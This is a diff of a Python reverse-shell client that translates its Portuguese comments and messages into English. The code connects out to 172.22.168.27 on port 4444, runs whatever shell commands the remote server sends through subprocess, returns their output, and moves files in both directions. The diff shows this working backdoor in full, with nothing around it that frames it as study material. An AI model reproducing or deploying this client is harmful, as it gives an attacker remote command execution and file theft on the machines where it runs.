@@ -4,22 +4,22 @@ import os
 import subprocess
 
 def data_send(data):
-    """Envia dados ao servidor."""
+    """Send data to the server."""
     jsondata = json.dumps(data)
-    soc.send(jsondata.encode()) 
+    soc.send(jsondata.encode())
 
 def data_recv():
-    """Recebe dados do servidor."""
+    """Receive data from the server."""
     data = ''
     while True:
         try:
             data += soc.recv(1024).decode().rstrip()
-            return json.loads(data) 
+            return json.loads(data)
         except ValueError:
             continue
 
 def download_file(file):
-    """Recebe um arquivo do servidor."""
+    """Receive a file from the server."""
     try:
         with open(file, 'wb') as f:
             soc.settimeout(5)
@@ -32,7 +32,7 @@ def download_file(file):
         soc.settimeout(None)
 
 def upload_file(file):
-    """Envia um arquivo para o servidor."""
+    """Send a file to the server."""
     try:
         with open(file, 'rb') as f:
             while True:
@@ -41,22 +41,22 @@ def upload_file(file):
                     break
                 soc.send(chunk)
     except FileNotFoundError:
-        print(f"[!] Arquivo não encontrado: {file}")
+        print(f"[!] File not found: {file}")
 
 def shell():
-    """Executa os comandos recebidos do servidor."""
+    """Execute commands received from the server."""
     while True:
         comm = data_recv()
         if comm == 'exit':
             break
         elif comm == 'clear':
-            pass  # Não há necessidade de executar clear no cliente
+            pass  # No need to execute clear on the client
         elif comm.startswith('cd '):
             try:
                 os.chdir(comm[3:])
-                data_send(f"[+] Diretório alterado para {os.getcwd()}")
+                data_send(f"[+] Changed directory to {os.getcwd()}")
             except FileNotFoundError:
-                data_send(f"[!] Diretório não encontrado: {comm[3:]}")
+                data_send(f"[!] Directory not found: {comm[3:]}")
         elif comm.startswith('upload '):
             download_file(comm[7:])
         elif comm.startswith('download '):
@@ -67,14 +67,14 @@ def shell():
                 rcomm = exe.stdout.read() + exe.stderr.read()
                 data_send(rcomm.decode())
             except Exception as e:
-                data_send(f"[!] Erro ao executar comando: {e}")
+                data_send(f"[!] Error executing command: {e}")
 
-# Configurações do cliente
+# Client setup
 soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 try:
-    soc.connect(('172.22.168.27', 4444))
+    soc.connect(('172.22.168.27', 4444))  # Replace with the server IP
     shell()
 except Exception as e:
-    print(f"[!] Erro ao conectar ao servidor: {e}")
+    print(f"[!] Error connecting to the server: {e}")
 finally:
     soc.close()
